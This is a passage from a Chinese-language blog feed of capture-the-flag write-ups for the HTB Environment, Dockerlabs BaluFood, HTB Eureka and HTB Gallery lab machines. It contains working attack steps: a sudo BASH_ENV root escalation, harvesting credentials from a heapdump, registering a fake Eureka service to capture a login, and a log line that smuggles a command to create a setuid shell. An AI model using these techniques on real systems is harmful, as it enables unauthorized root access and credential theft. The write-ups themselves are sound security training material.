-\u0026gt; summerSunnyB3ACH!! Root #\r查看sudo -l\nhish@environment:~$ sudo -l\r[sudo] password for hish: Matching Defaults entries for hish on environment:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=\u0026#34;ENV BASH_ENV\u0026#34;, use_pty\rUser hish may run the following commands on environment:\r(ALL) /usr/bin/systeminfo 其中可以看到env_keep保留了ENV和BASH_ENV两个环境变量因此可以用于绕过\nhish@environment:~$ echo \u0026#39;bash -p\u0026#39; \u0026gt; exp.sh\rhish@environment:~$ chmod +x exp.sh hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo root@environment:/home/hish# id\ruid=0(root) gid=0(root) groups=0(root)\rroot@environment:/home/hish# cat /root/root.txt 943dd249259dxxxxxxxxxxxx\rroot@environment:/home/hish# Summary #\rUser: 登录报错信息中泄露出源码，可以通过设置环境变量进行绕过登录。后台上传图片马，后缀用点绕过获得www-data权限，backup目录中泄露了gpg文件，并且密钥可读，可以直接解密到hish的密码。\nRoot: sudo环境变量引入。\n这个机器如其名，和环境有关。\n","date":"2025-05-07","externalUrl":null,"permalink":"/posts/2025/05/htb-environment/","section":"Posts","summary":"","title":"HTB-Environment","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/balufood ❯ nmap 172.17.0.2 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 69:15:7d:34:74:1c:21:8a:cb:2c:a2:8c:42:a4:21:7f (ECDSA)\r|_ 256 a7:3a:c9:b2:ac:cf:44:77:a7:9c:ab:89:98:c7:88:3f (ED25519)\r5000/tcp open http Werkzeug httpd 2.2.2 (Python 3.11.2)\r|_http-server-header: Werkzeug/2.2.2 Python/3.11.2\r|_http-title: Restaurante Balulero - Inicio Weak Pass #\r进入到172.17.0.2:5000/login\nusername:admin\rpassword:admin 可以ssh登录\n[root@kali] /home/kali/balufood ❯ ssh sysadmin@172.17.0.2 The authenticity of host \u0026#39;172.17.0.2 (172.17.0.2)\u0026#39; can\u0026#39;t be established.\rED25519 key fingerprint is SHA256:ZcJw57pSEVAGdPKcg6E5FVaWh/s1IMKnuLnTky7h3xQ.\rThis key is not known by any other names.\rAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\rWarning: Permanently added \u0026#39;172.17.0.2\u0026#39; (ED25519) to the list of known hosts.\rsysadmin@172.17.0.2\u0026#39;s password: Linux 880b1afd5905 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64\rThe programs included with the Debian GNU/Linux system are free software;\rthe exact distribution terms for each program are described in the\rindividual files in /usr/share/doc/*/copyright.\rDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\rpermitted by applicable law.\rLast login: Tue Apr 29 13:02:47 2025 from 172.17.0.1\rsysadmin@880b1afd5905:~$ ls\rapp.py restaurant.db static templates Own balulero #\r读取app.py可以得到密钥\nsysadmin@880b1afd5905:~$ cat app.py from flask import Flask, render_template, redirect, url_for, request, session, flash\rimport sqlite3\rfrom functools import wraps\rapp = Flask(__name__)\rapp.secret_key = \u0026#39;cuidaditocuidadin\u0026#39;\rDATABASE = \u0026#39;restaurant.db\u0026#39;\r........ 可以切换到balulero用户\nsysadmin@880b1afd5905:~$ su balulero\rPassword: balulero@880b1afd5905:/home/sysadmin$ ls\rls: cannot open directory \u0026#39;.\u0026#39;: Permission denied\rbalulero@880b1afd5905:/home/sysadmin$ cd ~ balulero@880b1afd5905:~$ ls\rbalulero@880b1afd5905:~$ ls -al\rtotal 28\rdrwx------ 3 balulero balulero 4096 Apr 29 12:58 .\rdrwxr-xr-x 1 root root 4096 Apr 29 12:56 ..\r-rw------- 1 balulero balulero 113 Apr 29 13:03 .bash_history\r-rw-r--r-- 1 balulero balulero 220 Apr 29 12:55 .bash_logout\r-rw-r--r-- 1 balulero balulero 3572 Apr 29 12:58 .bashrc\rdrwxr-xr-x 3 balulero balulero 4096 Apr 29 12:57 .local\r-rw-r--r-- 1 balulero balulero 807 Apr 29 12:55 .profile\rbalulero@880b1afd5905:~$ Root #\r注意到bash_history中对bashrc进行了修改\nbalulero@880b1afd5905:~$ cat .bash_history nano ~/.bashrc\rapt install nano -y\rexit\rnano ~/.bashrc\rsource nano ~/.bashrc\rsource ~/.bashrc\ralias\rsu root\rexit 在最后一行看到root密码\nbalulero@880b1afd5905:~$ cat .bashrc ...\r...\r...\ralias ser-root=\u0026#39;echo chocolate2 | su - root\u0026#39;\rbalulero@880b1afd5905:~$ su root Password: root@880b1afd5905:/home/balulero# id\ruid=0(root) gid=0(root) groups=0(root) Summary #\r很简单了，就不总结了。\n","date":"2025-05-01","externalUrl":null,"permalink":"/posts/2025/05/dockerlabs-balufood/","section":"Posts","summary":"","title":"Dockerlabs-BaluFood","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Eureka ❯ nmap Eureka.htb -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)\r| 256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)\r|_ 256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)\r80/tcp open http nginx 1.18.0 (Ubuntu)\r|_http-title: Did not follow redirect to http://furni.htb/\r|_http-server-header: nginx/1.18.0 (Ubuntu) 添加furni.htb到**/etc/hosts**\nNuclei #\r[root@kali] /home/kali/Eureka ❯ nuclei -u http://furni.htb\r__ _\r____ __ _______/ /__ (_)\r/ __ \\/ / / / ___/ / _ \\/ /\r/ / / / /_/ / /__/ / __/ /\r/_/ /_/\\__,_/\\___/_/\\___/_/ v3.4.2\rprojectdiscovery.io\r[INF] Current nuclei version: v3.4.2 (latest)\r[INF] Current nuclei-templates version: v10.2.0 (latest)\r[WRN] Scan results upload to cloud is disabled.\r[INF] New templates added in latest release: 268\r[INF] Templates loaded for current scan: 7894\r[INF] Executing 7697 signed templates from projectdiscovery/nuclei-templates\r[WRN] Loading 197 unsigned templates for scan. Use with caution.\r[INF] Targets loaded for current scan: 1\r[INF] Templates clustered: 1730 (Reduced 1626 Requests)\r[INF] Using Interactsh Server: oast.me\r[missing-sri] [http] [info] http://furni.htb [\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css\u0026#34;]\r[waf-detect:nginxgeneric] [http] [info] http://furni.htb\r[springboot-heapdump] [http] [critical] http://furni.htb/actuator/heapdump\r[ssh-auth-methods] [javascript] [info] furni.htb:22 [\u0026#34;[\u0026#34;publickey\u0026#34;,\u0026#34;password\u0026#34;]\u0026#34;]\r[ssh-password-auth] [javascript] [info] furni.htb:22\r[ssh-sha1-hmac-algo] [javascript] [info] furni.htb:22\r[ssh-server-enumeration] [javascript] [info] furni.htb:22 [\u0026#34;SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12\u0026#34;]\r[openssh-detect] [tcp] [info] furni.htb:22 [\u0026#34;SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12\u0026#34;]\r[springboot-features] [http] [low] http://furni.htb/actuator/features\r[nginx-version] [http] [info] http://furni.htb [\u0026#34;nginx/1.18.0\u0026#34;]\r[spring-detect] [http] [info] http://furni.htb/error\r[springboot-configprops] [http] [low] http://furni.htb/actuator/configprops\r[springboot-threaddump] [http] [low] http://furni.htb/actuator/threaddump\r[springboot-beans] [http] [low] http://furni.htb/actuator/beans 下载这个heapdump\nJDumpspider #\rwhwlsfb/JDumpSpider: HeapDump敏感信息提取工具 [root@kali] /home/kali/Eureka ❯ java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump\r===========================================\rSpringDataSourceProperties\r-------------\rpassword = 0sc@r190_S0l!dP@sswd\rdriverClassName = com.mysql.cj.jdbc.Driver\rurl = jdbc:mysql://localhost:3306/Furni_WebApp_DB\rusername = oscar190\r===========================================\rWeblogicDataSourceConnectionPoolConfig\r-------------\rnot found!\r===========================================\rMongoClient\r-------------\rnot found!\r===========================================\rAliDruidDataSourceWrapper\r-------------\rnot found!\r===========================================\rHikariDataSource\r-------------\rjava.lang.NumberFormatException: Cannot parse null string\rnot found!\r===========================================\rRedisStandaloneConfiguration\r-------------\rnot found!\r===========================================\rJedisClient\r-------------\rnot found!\r===========================================\rCookieRememberMeManager(ShiroKey)\r-------------\rnot found!\r===========================================\rOriginTrackedMapPropertySource\r-------------\rmanagement.endpoints.web.exposure.include = *\rspring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver\rspring.cloud.inetutils.ignoredInterfaces = enp0s.*\reureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\rserver.forward-headers-strategy = native\rspring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB\rspring.application.name = Furni\rserver.port = 8082\rspring.jpa.properties.hibernate.format_sql = true\rspring.session.store-type = jdbc\rspring.jpa.hibernate.ddl-auto = none\r===========================================\rMutablePropertySources\r-------------\rspring.cloud.client.ip-address = 127.0.0.1\rlocal.server.port = null\rspring.cloud.client.hostname = eureka\r===========================================\rMapPropertySources\r-------------\rspring.cloud.client.ip-address = 127.0.0.1\rspring.cloud.client.hostname = eureka\rlocal.server.port = null\r===========================================\rConsulPropertySources\r-------------\rnot found!\r===========================================\rJavaProperties\r-------------\rnot found!\r===========================================\rProcessEnvironment\r-------------\rnot found!\r===========================================\rOSS\r-------------\rorg.jboss.logging.provider = slf4j\r===========================================\rUserPassSearcher\r-------------\rorg.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter:\r[oauth2LoginEnabled = false, passwordParameter = password, formLoginEnabled = true, usernameParameter = username, loginPageUrl = /login, authenticationUrl = /login, saml2LoginEnabled = false, failureUrl = /login?error]\r[oauth2LoginEnabled = false, formLoginEnabled = false, saml2LoginEnabled = false]\rorg.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter:\r[passwordParameter = password, usernameParameter = username]\rorg.antlr.v4.runtime.atn.LexerATNConfig:\r[passedThroughNonGreedyDecision = false]\rorg.antlr.v4.runtime.atn.ATNDeserializationOptions:\r[generateRuleBypassTransitions = false]\rorg.hibernate.boot.internal.InFlightMetadataCollectorImpl:\r[inSecondPass = false]\rcom.mysql.cj.protocol.a.authentication.AuthenticationLdapSaslClientPlugin:\r[firstPass = true]\rcom.mysql.cj.protocol.a.authentication.CachingSha2PasswordPlugin:\r[publicKeyRequested = false]\rcom.mysql.cj.protocol.a.authentication.Sha256PasswordPlugin:\r[publicKeyRequested = false]\rcom.mysql.cj.NativeCharsetSettings:\r[platformDbCharsetMatches = true]\rcom.mysql.cj.protocol.a.NativeAuthenticationProvider:\r[database = Furni_WebApp_DB, useConnectWithDb = true, serverDefaultAuthenticationPluginName = mysql_native_password, username = oscar190]\rcom.mysql.cj.jdbc.ConnectionImpl:\r[password = 0sc@r190_S0l!dP@sswd, database = Furni_WebApp_DB, origHostToConnectTo = localhost, user = oscar190]\rcom.mysql.cj.conf.HostInfo:\r[password = 0sc@r190_S0l!dP@sswd, host = localhost, user = oscar190]\rcom.zaxxer.hikari.pool.HikariPool:\r[aliveBypassWindowMs = 500, isUseJdbc4Validation = true]\rorg.springframework.cloud.netflix.eureka.EurekaClientConfigBean:\r[eurekaServerConnectTimeoutSeconds = 5, useDnsForFetchingServiceUrls = false, eurekaServerReadTimeoutSeconds = 8, eurekaServerTotalConnections = 200, eurekaServiceUrlPollIntervalSeconds = 300, eurekaServerTotalConnectionsPerHost = 50]\rorg.springframework.boot.autoconfigure.security.SecurityProperties$User:\r[password = 4312eecb-54e8-46b9-a645-5b9df3ea21d8, passwordGenerated = true]\rorg.springframework.boot.autoconfigure.jdbc.DataSourceProperties:\r[password = 0sc@r190_S0l!dP@sswd, driverClassName = com.mysql.cj.jdbc.Driver, url = jdbc:mysql://localhost:3306/Furni_WebApp_DB, username = oscar190]\rorg.springframework.security.authentication.dao.DaoAuthenticationProvider:\r[hideUserNotFoundExceptions = true]\rcom.zaxxer.hikari.HikariDataSource:\r[keepaliveTime = 0, password = 0sc@r190_S0l!dP@sswd, jdbcUrl = jdbc:mysql://localhost:3306/Furni_WebApp_DB, driverClassName = com.mysql.cj.jdbc.Driver, username = oscar190]\rorg.apache.catalina.startup.Tomcat:\r[hostname = localhost]\r===========================================\rCookieThief\r-------------\rnot found!\r===========================================\rAuthThief\r-------------\rjava.util.LinkedHashMap$Entry:\rorg.springframework.security.config.annotation.authentication.configuration.InitializeUserDetailsBeanManagerConfigurer$InitializeUserDetailsManagerConfigurer = o.s.s.c.a.a.c.InitializeUserDetailsBeanManagerConfigurer$InitializeUserDetailsManagerConfigurer\rorg.springframework.security.config.annotation.authentication.configuration.InitializeAuthenticationProviderBeanManagerConfigurer$InitializeAuthenticationProviderManagerConfigurer = o.s.s.c.a.a.c.InitializeAuthenticationProviderBeanManagerConfigurer$InitializeAuthenticationProviderManagerConfigurer\r=========================================== 这个账户不能登录后台但是能够ssh\n查看到内网有8761端口开放\noscar190@eureka:/$ ss -tuln\rNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* udp UNCONN 0 0 *:37775 *:* udp UNCONN 0 0 *:58808 *:* tcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 4096 [::ffff:127.0.0.1]:8080 *:* tcp LISTEN 0 511 [::]:80 [::]:* tcp LISTEN 0 100 [::ffff:127.0.0.1]:8081 *:* tcp LISTEN 0 100 [::ffff:127.0.0.1]:8082 *:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 100 *:8761 *:* 在heapdump里面进行查找匹配，得到一个新的网址\n[root@kali] /home/kali/Eureka ❯ strings heapdump | grep 8761 -n 227464:P`http://localhost:8761/eureka/\r344576:http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!\r366651:http://localhost:8761/eureka/!\r442796:http://localhost:8761/eureka/!\r450355:Host: localhost:8761\r450870:http://localhost:8761/eureka/!\r451153:Host: localhost:8761 将8761端口进行转发出来\n[root@kali] /home/kali/Eureka ❯ ssh oscar190@furni.htb -L 8761:127.0.0.1:8761 访问需要输入用户名密码，用URL中给出的就可以进去\nusername:EurekaSrvr\rpassword:0scarPWDisTheB3st What is Eureka? #\rEureak 是Netflix 开源微服务框架中一系列项目中的一个。Spring Cloud对其进行了二次封装,形成了Spring Cloud Netflix 子项目,但未对Netflix微服务实现原理进行更改,只是进行了Spring Boot化,使开发者更容易使用和整合。\n什么是Eureka？Eureka能干什么？Eureka怎么用？-CSDN博客 Hacking Netflix Eureka #\r经过搜索我找到了这样一篇文章\nHacking Netflix Eureka | Backbase Engineering 在apps目录下可以看到这样的服务\n因此，我们可以伪造注册一个服务到 Eureka Server\noscar190@eureka:~$ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{ \u0026#34;instance\u0026#34;: {\r\u0026#34;instanceId\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;,\r\u0026#34;hostName\u0026#34;: \u0026#34;10.10.xx.xx\u0026#34;,\r\u0026#34;app\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;,\r\u0026#34;ipAddr\u0026#34;: \u0026#34;10.10.xx.xx\u0026#34;,\r\u0026#34;vipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;,\r\u0026#34;secureVipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;,\r\u0026#34;status\u0026#34;: \u0026#34;UP\u0026#34;,\r\u0026#34;port\u0026#34;: { \u0026#34;$\u0026#34;: 8081,\r\u0026#34;@enabled\u0026#34;: \u0026#34;true\u0026#34;\r},\r\u0026#34;dataCenterInfo\u0026#34;: {\r\u0026#34;@class\u0026#34;: \u0026#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\u0026#34;,\r\u0026#34;name\u0026#34;: \u0026#34;MyOwn\u0026#34;\r}\r}\r}\r\u0026#39; 然后在本机监听\n[root@kali] /home/kali/Eureka ❯ nc -lvnp 8081 username=miranda.wise%40furni.htb\u0026amp;password=IL%21veT0Be%26BeT0L0ve\u0026amp;_csrf=s0919JB_yc9-10PPrDWFranrfB0lKpnkPrcW4i6rgNDPpJrk1ypFwPRG_fpTsSb2mRixz5vdUSVAS6jJDI9z0xyetuX2wvnc# #miranda-wise\r#IL!veT0Be\u0026amp;BeT0L0ve Root #\r查看后台进程，可以发现这个脚本一直在被执行\nmiranda-wise@eureka:/opt$ ls -al\rtotal 24\rdrwxr-xr-x 4 root root 4096 Mar 20 14:17 .\rdrwxr-xr-x 19 root root 4096 Apr 22 12:47 ..\rdrwxrwx--- 2 root www-data 4096 Aug 7 2024 heapdump\r-rwxrwxr-x 1 root root 4980 Mar 20 14:17 log_analyse.sh\rdrwxr-x--- 2 root root 4096 Apr 9 18:34 scripts\rmiranda-wise@eureka:/opt$ cat log_analyse.sh #!/bin/bash\r# Colors\rGREEN=\u0026#39;\\033[0;32m\u0026#39;\rRED=\u0026#39;\\033[0;31m\u0026#39;\rYELLOW=\u0026#39;\\033[1;33m\u0026#39;\rBLUE=\u0026#39;\\033[0;34m\u0026#39;\rCYAN=\u0026#39;\\033[0;36m\u0026#39;\rRESET=\u0026#39;\\033[0m\u0026#39;\rLOG_FILE=\u0026#34;$1\u0026#34;\rOUTPUT_FILE=\u0026#34;log_analysis.txt\u0026#34;\rdeclare -A successful_users # Associative array: username -\u0026gt; count\rdeclare -A failed_users # Associative array: username -\u0026gt; count\rSTATUS_CODES=(\u0026#34;200:0\u0026#34; \u0026#34;201:0\u0026#34; \u0026#34;302:0\u0026#34; \u0026#34;400:0\u0026#34; \u0026#34;401:0\u0026#34; \u0026#34;403:0\u0026#34; \u0026#34;404:0\u0026#34; \u0026#34;500:0\u0026#34;) # Indexed array: \u0026#34;code:count\u0026#34; pairs\rif [ ! -f \u0026#34;$LOG_FILE\u0026#34; ]; then\recho -e \u0026#34;${RED}Error: Log file $LOG_FILE not found.${RESET}\u0026#34;\rexit 1\rfi\ranalyze_logins() {\r# Process successful logins\rwhile IFS= read -r line; do\rusername=$(echo \u0026#34;$line\u0026#34; | awk -F\u0026#34;\u0026#39;\u0026#34; \u0026#39;{print $2}\u0026#39;)\rif [ -n \u0026#34;${successful_users[$username]+_}\u0026#34; ]; then\rsuccessful_users[$username]=$((successful_users[$username] + 1))\relse\rsuccessful_users[$username]=1\rfi\rdone \u0026lt; \u0026lt;(grep \u0026#34;LoginSuccessLogger\u0026#34; \u0026#34;$LOG_FILE\u0026#34;)\r# Process failed logins\rwhile IFS= read -r line; do\rusername=$(echo \u0026#34;$line\u0026#34; | awk -F\u0026#34;\u0026#39;\u0026#34; \u0026#39;{print $2}\u0026#39;)\rif [ -n \u0026#34;${failed_users[$username]+_}\u0026#34; ]; then\rfailed_users[$username]=$((failed_users[$username] + 1))\relse\rfailed_users[$username]=1\rfi\rdone \u0026lt; \u0026lt;(grep \u0026#34;LoginFailureLogger\u0026#34; \u0026#34;$LOG_FILE\u0026#34;)\r}\ranalyze_http_statuses() {\r# Process HTTP status codes\rwhile IFS= read -r line; do\rcode=$(echo \u0026#34;$line\u0026#34; | grep -oP \u0026#39;Status: \\K.*\u0026#39;)\rfound=0\r# Check if code exists in STATUS_CODES array\rfor i in \u0026#34;${!STATUS_CODES[@]}\u0026#34;; do\rexisting_entry=\u0026#34;${STATUS_CODES[$i]}\u0026#34;\rexisting_code=$(echo \u0026#34;$existing_entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f1)\rexisting_count=$(echo \u0026#34;$existing_entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f2)\rif [[ \u0026#34;$existing_code\u0026#34; -eq \u0026#34;$code\u0026#34; ]]; then\rnew_count=$((existing_count + 1))\rSTATUS_CODES[$i]=\u0026#34;${existing_code}:${new_count}\u0026#34;\rbreak\rfi\rdone\rdone \u0026lt; \u0026lt;(grep \u0026#34;HTTP.*Status: \u0026#34; \u0026#34;$LOG_FILE\u0026#34;)\r}\ranalyze_log_errors(){\r# Log Level Counts (colored)\recho -e \u0026#34;\\n${YELLOW}[+] Log Level Counts:${RESET}\u0026#34;\rlog_levels=$(grep -oP \u0026#39;(?\u0026lt;=Z )\\w+\u0026#39; \u0026#34;$LOG_FILE\u0026#34; | sort | uniq -c)\recho \u0026#34;$log_levels\u0026#34; | awk -v blue=\u0026#34;$BLUE\u0026#34; -v yellow=\u0026#34;$YELLOW\u0026#34; -v red=\u0026#34;$RED\u0026#34; -v reset=\u0026#34;$RESET\u0026#34; \u0026#39;{\rif ($2 == \u0026#34;INFO\u0026#34;) color=blue;\relse if ($2 == \u0026#34;WARN\u0026#34;) color=yellow;\relse if ($2 == \u0026#34;ERROR\u0026#34;) color=red;\relse color=reset;\rprintf \u0026#34;%s%6s %s%s\\n\u0026#34;, color, $1, $2, reset\r}\u0026#39;\r# ERROR Messages\rerror_messages=$(grep \u0026#39; ERROR \u0026#39; \u0026#34;$LOG_FILE\u0026#34; | awk -F\u0026#39; ERROR \u0026#39; \u0026#39;{print $2}\u0026#39;)\recho -e \u0026#34;\\n${RED}[+] ERROR Messages:${RESET}\u0026#34;\recho \u0026#34;$error_messages\u0026#34; | awk -v red=\u0026#34;$RED\u0026#34; -v reset=\u0026#34;$RESET\u0026#34; \u0026#39;{print red $0 reset}\u0026#39;\r# Eureka Errors\reureka_errors=$(grep \u0026#39;Connect to http://localhost:8761.*failed: Connection refused\u0026#39; \u0026#34;$LOG_FILE\u0026#34;)\reureka_count=$(echo \u0026#34;$eureka_errors\u0026#34; | wc -l)\recho -e \u0026#34;\\n${YELLOW}[+] Eureka Connection Failures:${RESET}\u0026#34;\recho -e \u0026#34;${YELLOW}Count: $eureka_count${RESET}\u0026#34;\recho \u0026#34;$eureka_errors\u0026#34; | tail -n 2 | awk -v yellow=\u0026#34;$YELLOW\u0026#34; -v reset=\u0026#34;$RESET\u0026#34; \u0026#39;{print yellow $0 reset}\u0026#39;\r}\rdisplay_results() {\recho -e \u0026#34;${BLUE}----- Log Analysis Report -----${RESET}\u0026#34;\r# Successful logins\recho -e \u0026#34;\\n${GREEN}[+] Successful Login Counts:${RESET}\u0026#34;\rtotal_success=0\rfor user in \u0026#34;${!successful_users[@]}\u0026#34;; do\rcount=${successful_users[$user]}\rprintf \u0026#34;${GREEN}%6s %s${RESET}\\n\u0026#34; \u0026#34;$count\u0026#34; \u0026#34;$user\u0026#34;\rtotal_success=$((total_success + count))\rdone\recho -e \u0026#34;${GREEN}\\nTotal Successful Logins: $total_success${RESET}\u0026#34;\r# Failed logins\recho -e \u0026#34;\\n${RED}[+] Failed Login Attempts:${RESET}\u0026#34;\rtotal_failed=0\rfor user in \u0026#34;${!failed_users[@]}\u0026#34;; do\rcount=${failed_users[$user]}\rprintf \u0026#34;${RED}%6s %s${RESET}\\n\u0026#34; \u0026#34;$count\u0026#34; \u0026#34;$user\u0026#34;\rtotal_failed=$((total_failed + count))\rdone\recho -e \u0026#34;${RED}\\nTotal Failed Login Attempts: $total_failed${RESET}\u0026#34;\r# HTTP status codes\recho -e \u0026#34;\\n${CYAN}[+] HTTP Status Code Distribution:${RESET}\u0026#34;\rtotal_requests=0\r# Sort codes numerically\rIFS=$\u0026#39;\\n\u0026#39; sorted=($(sort -n -t\u0026#39;:\u0026#39; -k1 \u0026lt;\u0026lt;\u0026lt;\u0026#34;${STATUS_CODES[*]}\u0026#34;))\runset IFS\rfor entry in \u0026#34;${sorted[@]}\u0026#34;; do\rcode=$(echo \u0026#34;$entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f1)\rcount=$(echo \u0026#34;$entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f2)\rtotal_requests=$((total_requests + count))\r# Color coding\rif [[ $code =~ ^2 ]]; then color=\u0026#34;$GREEN\u0026#34;\relif [[ $code =~ ^3 ]]; then color=\u0026#34;$YELLOW\u0026#34;\relif [[ $code =~ ^4 || $code =~ ^5 ]]; then color=\u0026#34;$RED\u0026#34;\relse color=\u0026#34;$CYAN\u0026#34;\rfi\rprintf \u0026#34;${color}%6s %s${RESET}\\n\u0026#34; \u0026#34;$count\u0026#34; \u0026#34;$code\u0026#34;\rdone\recho -e \u0026#34;${CYAN}\\nTotal HTTP Requests Tracked: $total_requests${RESET}\u0026#34;\r}\r# Main execution\ranalyze_logins\ranalyze_http_statuses\rdisplay_results | tee \u0026#34;$OUTPUT_FILE\u0026#34;\ranalyze_log_errors | tee -a \u0026#34;$OUTPUT_FILE\u0026#34;\recho -e \u0026#34;\\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}\u0026#34; 关键点在这里👇\n这里的 [[ \u0026quot;$existing_code\u0026quot; -eq \u0026quot;$code\u0026quot; ]]，是 算术比较，$code 中一旦嵌入 $(...)，Bash 会先执行括号内的命令。\nanalyze_http_statuses() {\r# Process HTTP status codes\rwhile IFS= read -r line; do\rcode=$(echo \u0026#34;$line\u0026#34; | grep -oP \u0026#39;Status: \\K.*\u0026#39;)\rfound=0\r# Check if code exists in STATUS_CODES array\rfor i in \u0026#34;${!STATUS_CODES[@]}\u0026#34;; do\rexisting_entry=\u0026#34;${STATUS_CODES[$i]}\u0026#34;\rexisting_code=$(echo \u0026#34;$existing_entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f1)\rexisting_count=$(echo \u0026#34;$existing_entry\u0026#34; | cut -d\u0026#39;:\u0026#39; -f2)\rif [[ \u0026#34;$existing_code\u0026#34; -eq \u0026#34;$code\u0026#34; ]]; then\rnew_count=$((existing_count + 1))\rSTATUS_CODES[$i]=\u0026#34;${existing_code}:${new_count}\u0026#34;\rbreak\rfi\rdone\rdone \u0026lt; \u0026lt;(grep \u0026#34;HTTP.*Status: \u0026#34; \u0026#34;$LOG_FILE\u0026#34;)\r} 类似提权的机器可以参考一下：HackMyVM | Todd\n注意到当前的目录所有者，因此可以覆盖application.log\nmiranda-wise@eureka:/var/www/web/cloud-gateway/log$ ls -al\rtotal 48\rdrwxrwxr-x 2 www-data developers 4096 Apr 29 04:12 .\rdrwxrwxr-x 6 www-data developers 4096 Mar 18 21:17 ..\r-rw-r--r-- 1 www-data www-data 21254 Apr 29 04:34 application.log\r-rw-rw-r-- 1 www-data www-data 5702 Apr 23 07:37 application.log.2025-04-22.0.gz\r-rw-rw-r-- 1 www-data www-data 5956 Apr 29 03:13 application.log.2025-04-23.0.gz\rmiranda-wise@eureka:/var/www/web/cloud-gateway/log$ id\ruid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers) 写入恶意代码\nmiranda-wise@eureka:/var/www/web/cloud-gateway/log$ rm application.log\rrm: remove write-protected regular file \u0026#39;application.log\u0026#39;? y\rmiranda-wise@eureka:/var/www/web/cloud-gateway/log$ echo \u0026#39;HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]\u0026#39; \u0026gt;\u0026gt; application.log Summary #\rUser：heapdump导致的密码泄露，内网端口上的Eureka服务存在漏洞，通过注册一个伪造的微服务实例，并获取到了用户凭证。\nRoot：分析脚本可以看到存在数组比较的漏洞，这个我刚好在Todd靶机中做过，当前用户组可以修改日志文件，从而达到提权。\n","date":"2025-04-29","externalUrl":null,"permalink":"/posts/2025/04/htb-eureka/","section":"Posts","summary":"","title":"HTB-Eureka","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Gallery ❯ nmap 172.17.0.3 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 19:95:1a:f2:f6:7a:a1:f1:ba:16:4b:58:a0:59:f2:02 (ECDSA)\r|_ 256 e7:e9:8f:b8:db:94:c2:68:11:4c:25:81:f1:ac:cd:ac (ED25519)\r80/tcp open http PHP cli server 5.5 or later (PHP 8.3.6)\r|_http-title: Galer\\xC3\\xADa de Arte Digital Feroxbuster #\r[root@kali] /home/kali/Gallery ❯ feroxbuster -u \u0026#39;http://172.17.0.3/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt ___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.11.0\r───────────────────────────┬──────────────────────\r🎯 Target Url │ http://172.17.0.3/\r🚀 Threads │ 50\r📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r👌 Status Codes │ All Status Codes!\r💥 Timeout (secs) │ 7\r🦡 User-Agent │ feroxbuster/2.11.0\r💉 Config File │ /etc/feroxbuster/ferox-config.toml\r🔎 Extract Links │ 